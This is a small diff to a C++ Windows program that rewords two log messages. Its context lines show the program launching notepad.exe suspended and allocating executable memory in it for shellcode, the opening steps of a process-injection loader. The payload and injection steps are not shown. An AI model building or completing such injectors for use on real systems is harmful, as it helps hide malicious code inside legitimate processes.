@@ -24,7 +24,7 @@ int main() {
 
 	PROCESS_INFORMATION PI;
 	
-	std::cout << "[+] Create process [Notepad::]" << std::endl;
+	std::cout << "[+] Create process [Notepad]" << std::endl;
 
 	if (CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI) == 0) {
 		std::cerr << "[-] Err : Creation Processus : " << GetLastError() << std::endl;
@@ -32,7 +32,7 @@ int main() {
 	}
 	DWORD pid = PI.dwProcessId;
 
-	std::cout << "[+] Allocate Memory [pid::"<< pid << "]" << std::endl;
+	std::cout << "[+] Allocate Memory [" << pid << "]" << std::endl;
 
 	LPVOID VAllocEx = VirtualAllocEx(PI.hProcess, NULL, Shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (VAllocEx == NULL) {
